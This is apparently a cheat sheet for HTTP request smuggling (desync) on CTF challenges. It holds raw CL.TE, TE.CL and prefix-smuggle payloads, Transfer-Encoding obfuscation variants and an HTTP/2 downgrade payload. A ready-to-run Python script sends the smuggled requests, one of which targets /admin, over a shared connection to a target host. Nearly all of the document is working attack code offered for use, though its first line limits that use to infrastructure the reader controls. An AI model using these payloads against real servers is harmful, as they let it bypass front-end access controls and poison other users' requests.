# Desync

Use on CTF infra you control or challenge endpoints. Start with one harmless probe, then confirm with a visible prefix.

## CL.TE

```http
POST / HTTP/1.1
Host: HOST
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

## TE.CL

```http
POST / HTTP/1.1
Host: HOST
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST /404 HTTP/1.1
Host: HOST

0

```

## Prefix Smuggle

```http
POST / HTTP/1.1
Host: HOST
Content-Length: 45
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: HOST

```

Then send a normal request on the same connection.

## Python

```python
import socket
import ssl

HOST = "target.com"
PORT = 443
TLS = True


def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    if TLS:
        s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
    return s


def recv_some(s):
    s.settimeout(2)
    out = b""
    try:
        while True:
            out += s.recv(4096)
            if len(out) > 20000:
                break
    except TimeoutError:
        pass
    return out


def send_pair(first, second):
    s = connect()
    s.sendall(first)
    print(recv_some(s).decode(errors="replace"))
    s.sendall(second)
    print(recv_some(s).decode(errors="replace"))
    s.close()


def req(method, path, body=b"", headers=None, keep=True):
    headers = headers or {}
    head = [
        f"{method} {path} HTTP/1.1",
        f"Host: {HOST}",
        f"Connection: {'keep-alive' if keep else 'close'}",
    ]
    for k, v in headers.items():
        head.append(f"{k}: {v}")
    return ("\r\n".join(head) + "\r\n\r\n").encode() + body


normal = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
).encode()

cl_te = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Length: 6\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
    f"X"
).encode()

smuggled_404 = (
    f"GPOST /404 HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"\r\n"
).encode()

te_cl = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Length: 4\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
).encode() + f"{len(smuggled_404):x}\r\n".encode() + smuggled_404 + b"0\r\n\r\n"

smuggled_admin = (
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"\r\n"
).encode()

prefix_body = b"0\r\n\r\n" + smuggled_admin
prefix = req("POST", "/", prefix_body, {
    "Content-Length": str(len(prefix_body)),
    "Transfer-Encoding": "chunked",
})

send_pair(cl_te, normal)
# send_pair(te_cl, normal)
# send_pair(prefix, normal)
```

## TE Obfuscation

```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding:	 chunked
```

## HTTP/2 Downgrade

```text
h2 frontend -> h1 backend
content-length kept during downgrade
path/header normalization differs
```

Try:

```http
:method POST
:path /
content-length: 0

GET /admin HTTP/1.1
Host: HOST

```

## Confirm

```text
1. Poison with a request for /404 or /canary.
2. Send normal request on same connection.
3. Look for shifted status/body.
4. Repeat with a unique marker.
```
